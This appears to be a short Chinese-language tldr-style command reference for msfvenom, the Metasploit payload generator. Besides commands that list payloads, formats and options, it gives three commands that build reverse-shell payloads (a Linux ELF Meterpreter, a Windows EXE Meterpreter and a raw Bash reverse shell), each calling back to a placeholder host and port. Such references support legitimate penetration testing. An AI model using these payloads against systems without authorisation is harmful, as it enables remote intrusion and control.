# msfvenom

> 手动生成 Metasploit 的有效载荷。
> 更多信息：<https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>。

- 列出有效载荷：

`msfvenom -l payloads`

- 列出格式：

`msfvenom -l formats`

- 显示有效载荷选项：

`msfvenom -p {{payload}} --list-options`

- 创建带有反向 TCP 处理程序的 ELF 二进制文件：

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf -o {{path/to/binary}}`

- 创建带有反向 TCP 处理程序的 EXE 二进制文件：

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe -o {{path/to/binary.exe}}`

- 创建带有反向 TCP 处理程序的原始 Bash：

`msfvenom -p cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} -f raw`